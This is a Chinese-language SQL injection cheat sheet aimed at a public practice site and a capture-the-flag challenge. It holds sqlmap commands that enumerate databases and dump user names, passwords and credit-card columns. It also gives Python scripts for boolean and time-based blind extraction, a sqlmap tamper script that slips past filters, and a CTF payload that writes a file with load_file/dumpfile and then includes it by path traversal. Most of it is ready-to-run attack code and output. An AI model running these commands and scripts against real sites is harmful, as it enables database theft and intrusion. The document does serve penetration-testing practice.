# 常规流程

## 判断注入

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" --random-agent --batch
```

```bash
---
参数: artist (GET)
    类型: boolean-based blind
    标题: AND boolean-based blind - WHERE or HAVING clause
    Payload: artist=1 AND 9068=9068

    类型: time-based blind
    标题: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: artist=1 RLIKE SLEEP(5)

    类型: UNION query
    标题: Generic UNION query (NULL) - 3 columns
    Payload: artist=-6045 UNION ALL SELECT CONCAT(0x7162717671,0x676f62727961545065776a6b6d786b44584c787664505a446e6a50484f737564537261656a414749,0x7170706b71),NULL,NULL-- -
---
[20:58:40] [INFO] 后端DBMS是 MySQL
web 服务 operating system: Linux Ubuntu
web 应用技术: Nginx 1.19.0, PHP 5.6.40
后端 DBMS: MySQL >= 5.0.12
```

## 获取基础敏感信息

1、指定数据库，判断当前用户权限  `--is-dba`

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1"  --dbms mysql --random-agent --batch --is-dba
```

```bash
当前用户是DBA: False
```

2、`--current-user` 用户连接的用户

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1"  --dbms mysql --random-agent --batch --current-user
```

```
当前用户: 'acuart@localhost'
```

3、`--passwords` 获取数据库的密码 使用这个命令 sqlmap找到密文时，会提示你是否进行hash破解 如果需要选择合适的字典。

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1"  --dbms mysql --random-agent --batch --passwords
```

4、综合测试，`--current-db` 显示当前库

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbms mysql --random-agent --current-user --current-db --is-dba --passwords -v 1
```

```
当前用户: 'acuart@localhost'
当前数据库: 'acuart'
当前用户是DBA: False
[21:10:05] [WARNING] 无法检索用户的密码 哈希数 'acuart'
[21:10:05] [ERROR] 无法检索数据库用户的密码哈希
```

## 获取所有库

`--dbs`

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1"  --dbms mysql --random-agent --batch --dbs
```

```
可用数据库: [2]:
[*] acuart
[*] information_schema
```

## 获取表

根据库列出表， `-D` 指定库 ，`--tables` 列出所有表

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1"  --dbms mysql --random-agent --batch -D acuart --tables
```

```
数据库: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+
```

## 获取表字段

1、获取某个表的所有字段，`-T` 指定某个表 ，`--columns` 获取字段

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1"  --dbms mysql --random-agent --batch -D acuart -T users --columns
```

```
Database: acuart
Table: users
[8 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| address | mediumtext   |
| cart    | varchar(100) |
| cc      | varchar(100) |
| email   | varchar(100) |
| name    | varchar(100) |
| pass    | varchar(100) |
| phone   | varchar(100) |
| uname   | varchar(100) |
+---------+--------------+
```

2、获取某个库的所有表的所有字段

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1"  --dbms mysql --random-agent --batch -D acuart -tables --columns
```

## 获取表中数据

`--dump` 是导出数据所有内容 ，`--dump -C "uname,pass"` 获取指定字段的内容

1、获取指定库所有表所有字段内容

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1"  --dbms mysql --random-agent --batch -D acuart  -tables --columns --dump
```

2、获取指定表的所有字段内容

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1"  --dbms mysql --random-agent --batch -D acuart -T users --columns --dump
```

3、获取指定表指定字段内容

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1"  --dbms mysql --random-agent --batch -D acuart -T users -C "uname,pass" --dump
```

# 盲注脚本

## 前置靶场环境

```http
http://testphp.vulnweb.com/artists.php?artist=1
```

```
---
参数: artist (GET)
    类型: boolean-based blind
    标题: AND boolean-based blind - WHERE or HAVING clause
    Payload: artist=1 AND 9068=9068

    类型: time-based blind
    标题: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: artist=1 RLIKE SLEEP(5)

    类型: UNION query
    标题: Generic UNION query (NULL) - 3 columns
    Payload: artist=-6045 UNION ALL SELECT CONCAT(0x7162717671,0x676f62727961545065776a6b6d786b44584c787664505a446e6a50484f737564537261656a414749,0x7170706b71),NULL,NULL-- -
---
[20:58:40] [INFO] 后端DBMS是 MySQL
web 服务 operating system: Linux Ubuntu
web 应用技术: Nginx 1.19.0, PHP 5.6.40
后端 DBMS: MySQL >= 5.0.12
```

```
可用数据库: [2]:
[*] acuart
[*] information_schema

数据库: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+

[*]users表数据
cc	cart	name	pass	email	phone	uname	address
9502953917	8ba610f5e2a978a5d112f3c9e02a7d94	[[${#rt = @java.lang.Runtime@getRuntime(),#rt.exec(	test	email@email.com	2323345	test	21 street
```

## 布尔盲注

### 版本一

#### 测试paylaod

```
?artist=1 and if(ascii(substr(database(),1,1))>79,1,2)=1  #查数据库
```

```
(select group_concat(table_name) from information_schema.tables where table_schema=database()) #查表
```

```
(select group_concat(column_name) from information_schema.columns where table_name='users') #查特定表的字段
```

```
(select uname from acuart.users)                              #查特定表中特定信息
```

#### py脚本

```python
import requests

url0 = "http://testphp.vulnweb.com/artists.php"
result = ""
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    # 查数据库
    # payload = "database()"
    # 查表
    # payload = "(select group_concat(table_name) from information_schema.tables where table_schema=database())"
    # 查特定表的字段
    # payload = "(select group_concat(column_name) from information_schema.columns where table_name='users')"
    # 查特定表中特定信息
    payload = "(select uname  from acuart.users)"
    while head < tail:
        mid = (head + tail) >> 1

        exp = f"?artist=1 and if(ascii(substr({payload},{i},1))>{mid},1,2)=1"
        url = url0 + exp

        # print(url)
        r = requests.get(url)
        if "artist: r4w8173" in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:  # 这里很细节，因为数据的最后一位的下一位永远不存在，在阿斯克码表里为 32 即为 空格
        result += chr(head)
    else:           # 所以 head 与 tail 终究都会 等于 32 ，即 触发 break
        break
    print(result)
```

阿斯克码表：

<img src=".\图片\v2-99d2c2240b51e0dc2772927113111992_b.png" alt="v2-99d2c2240b51e0dc2772927113111992_b"  />

### 版本二

与版本一类似，就是用 `ord` 函数替换 `ascii` 函数

### 版本三

正则匹配  `regexp()` 函数

```python
import requests
import string

url0 = "http://testphp.vulnweb.com/artists.php"

def getlength():
   length = 0
   paylaod = "database()"
   for len in range(1, 99):
     exp = f"?artist=1 and if(length({paylaod})={len},1,0)=1"
     url = url0 + exp
     r = requests.get(url)
     if "artist: r4w8173" in r.text:
         print(len)

def getdata():
    data = ''
    flag = string.ascii_lowercase + string.digits
    payload = "database()"
    for i in range(1, 7):   #注意这里的右边界该为 上个函数里的 len+1
        for j in flag:
            exp = f"?artist=1 and if(substr({payload},{i},1)regexp('{j}'),1,2)=1"
            url = url0 + exp
            r = requests.get(url)
            if "artist: r4w8173" in r.text:
                data += j
                print(data)

if __name__ == '__main__':
    # 这里的payload是以数据库为例，可以随意更改，如版本一样
    # getlength()
    getdata()
```

## 时间盲注

大体上与布尔盲注思路一样，不通的是判断的逻辑

用 `timeout` 设置超时时间 与 捕获异常 来判断

```python
        try:
            r = requests.post(url, data=data, timeout=1)
            tail = mid
        except Exception as e:
            head = mid + 1
```

# tamper脚本

```python
#!/usr/bin/env python
"""
Author:Y4tacker
y4 写的 tamper ，  = 这里用 like 绕过
"""

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW


def tamper(payload, **kwargs):
    payload = space2comment(payload)
    return payload


def space2comment(payload):
    retVal = payload
    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x0a)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == "*":
                retVal += chr(0x31)
                continue

            elif payload[i] == "=":
                retVal += chr(0x0a)+'like'+chr(0x0a)
                continue

            elif payload[i] == " " and not doublequote and not quote:
                retVal += chr(0x0a)
                continue

            retVal += payload[i]

    return retVal
```

# 其它

## 一

[CTFSHOW\]中期测评WP(差512和514)_Y4tacker的博客-CSDN博客](https://blog.csdn.net/solitudi/article/details/115739632?ops_request_misc=&request_id=945ca7dd90a24287830bfe59cbe62b21&biz_id=&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~koosearch~default-12-115739632-null-null.268^v1^control&utm_term=ctfshow&spm=1018.2226.3001.4450)

ctfshow  web491

```http
http://1e6526fd-3805-4ddd-bfca-5ba269c93212.chall.ctf.show:8080/index.php?action=clear
```

```http
http://389af0f6-12b5-448f-8e75-8e3c5c172cd4.chall.ctf.show:8080/index.php?action=check&username=1' union select load_file("/flag") into dumpfile "/tmp/4.php"--+&password=1
```

```http
http://389af0f6-12b5-448f-8e75-8e3c5c172cd4.chall.ctf.show:8080/index.php?action=../../../../../../../../tmp/4
```


